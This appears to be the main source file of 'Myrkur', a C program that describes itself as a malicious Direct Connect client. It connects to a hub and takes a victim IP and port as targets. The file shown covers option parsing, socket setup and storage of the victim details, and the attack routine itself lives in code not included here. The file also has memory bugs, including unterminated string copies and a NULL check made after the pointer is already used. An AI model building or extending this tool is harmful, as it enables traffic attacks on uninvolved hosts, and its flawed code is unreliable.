/*
 *	src/main.c
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <getopt.h>

#include <myrkur/client.h>

int myrkur_free(struct client_t *client)
{
	/* free client->victim->port */
	if (client->victim->port != NULL) {
		free(client->victim->port);
	}

	/* free client->victim->ip */
	if (client->victim->ip != NULL) {
		free(client->victim->ip);
	}

	/* free client->victim */
	if (client->victim != NULL) {
		free(client->victim);
	}

	return 0;
}

int myrkur_main(struct client_t *client)
{
	client_connect(client);

	return 0;
}

int myrkur_alloc(struct client_t *client, struct host_t *host, struct host_t *victim)
{
	struct sockaddr_in address;

	size_t size;

	memset(client, 0, sizeof(struct client_t));
	memset(&address, 0, sizeof(struct sockaddr_in));

	client->socket = socket(AF_INET, SOCK_STREAM, 0);
	client->port = strtoul(host->port, NULL, 10);

	if (client->socket < 0) {
		fprintf(stderr, "myrkur_alloc(): Error: socket() failed!\n");
		return -1;
	}

	address.sin_family = AF_INET;
	address.sin_port = htons(client->port);

	if (inet_pton(AF_INET, host->ip, &(address.sin_addr)) <= 0) {
		fprintf(stderr, "myrkur_alloc(): Error: inet_pton() failed!\n");
		return -1;
	}

	if (connect(client->socket, (struct sockaddr *) &address, sizeof(struct sockaddr_in)) < 0) {
		fprintf(stderr, "myrkur_alloc(): Error: connect() failed!\n");
		return -1;
	}

	/* save victim command line options */
	client->victim = (struct host_t *) malloc (sizeof(struct host_t));

	size = strlen(victim->ip) * sizeof(char);
	client->victim->ip = (char *) malloc (size + sizeof(char));
	strncpy(client->victim->ip, victim->ip, size);

	size = strlen(victim->port) * sizeof(char);
	client->victim->port = (char *) malloc (size + sizeof(char));
	strncpy(client->victim->port, victim->port, size);

	return 0;
}

void myrkur_help(char *cmd)
{
	fprintf(stderr, "Usage: %s [OPTION]\n", cmd);
	fprintf(stderr, "Myrkur: Malicious DC client\n");
	fprintf(stderr, "  -i, --hostip\t\tSpecify host IP\n");
	fprintf(stderr, "  -p, --hostport\tSpecify host port\n");
	fprintf(stderr, "  -j, --victimip\tSpecify victim IP\n");
	fprintf(stderr, "  -k, --victimport\tSpecify victim port\n");
	fprintf(stderr, "  -h, --help\t\tDisplay this help message\n");
}

int main (int argc, char **argv)
{
	struct client_t client;

	const char *short_options = "hi:p:j:k:";

	struct option long_options[] = {
		{"help",             no_argument, NULL, 'h'},
		{"hostip",     required_argument, NULL, 'i'},
		{"hostport",   required_argument, NULL, 'p'},
		{"victimip",   required_argument, NULL, 'j'},
		{"victimport", required_argument, NULL, 'k'}
	};

	struct host_t host;
	struct host_t victim;

	int ret;

	memset(&host, 0, sizeof(struct host_t));
	memset(&victim, 0, sizeof(struct host_t));

	/* process command line options */
	while ((ret = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
		switch(ret) {
			case 'i':
				host.ip = optarg;
				break;
			case 'p':
				host.port = optarg;
				break;
			case 'j':
				victim.ip = optarg;
				break;
			case 'k':
				victim.port = optarg;
				break;
			case 'h':
				myrkur_help(argv[0]);
				return 0;
			case '?':
				fprintf(stderr, "Ignoring unknown option. Try --help\n");
				break;
		}
	}

	/* check for required command ine arguments for the host */
	if (host.ip == NULL || host.port == NULL) {
		myrkur_help("myrkur");
		return -1;
	}

	/* check for required command line arguments for the victim */
	if (victim.ip == NULL || victim.port == NULL) {
		myrkur_help("myrkur");
		return -1;
	}

	/* lift off! */
	if (myrkur_alloc(&client, &host, &victim) == -1) {
		return -1;
	}

	if (myrkur_main(&client) == -1) {
		return -1;
	}

	if (myrkur_free(&client) == -1) {
		return -1;
	}

	return 0;
}
